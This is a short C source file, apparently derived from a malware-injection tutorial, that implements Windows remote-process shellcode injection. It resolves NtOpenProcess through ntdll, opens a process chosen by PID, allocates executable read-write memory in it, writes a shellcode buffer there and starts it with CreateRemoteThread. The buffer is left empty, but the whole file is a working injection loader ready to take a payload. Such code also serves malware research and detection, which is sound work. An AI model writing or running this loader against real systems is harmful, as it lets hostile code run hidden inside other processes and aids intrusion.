/*
Based on 
https://cocomelonc.github.io/tutorial/2021/12/11/malware-injection-11.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")

#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
	HANDLE             ProcessHandle,
	PVOID              *BaseAddress,
	ULONG              ZeroBits,
	PULONG             RegionSize,
	ULONG              AllocationType,
	ULONG              Protect
	);

// dt nt!_UNICODE_STRING
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
	ULONG              Length;
	HANDLE             RootDirectory;
	PUNICODE_STRING    ObjectName;
	ULONG              Attributes;
	PVOID              SecurityDescriptor;
	PVOID              SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID {
	PVOID              UniqueProcess;
	PVOID              UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
	PHANDLE            ProcessHandle,
	ACCESS_MASK        AccessMask,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID         ClientID
	);


unsigned char buf[] = "";

int main(int argc, char* argv[]) {
	HANDLE ph; // process handle
	HANDLE rt; // remote thread
	PVOID rb; // remote buffer
	DWORD pid; // process ID

	pid = atoi(argv[1]);
	OBJECT_ATTRIBUTES oa;

	CLIENT_ID cid;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread = 0;

	// loading ntdll.dll
	HMODULE ntdll = GetModuleHandleA("ntdll");
	printf("PID: %i", pid);

	pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
	
	pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

	// open remote proces via NT API
	myNtOpenProcess(&ph, PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, &oa, &cid);

	if (!ph) {
		printf("failed to open process :(\n");
		return -2;
	}

	PVOID va = VirtualAllocEx(ph, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(ph, va, buf, sizeof buf, NULL);
	HANDLE h_thread = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)va, NULL, 0, NULL);
	return 0;
}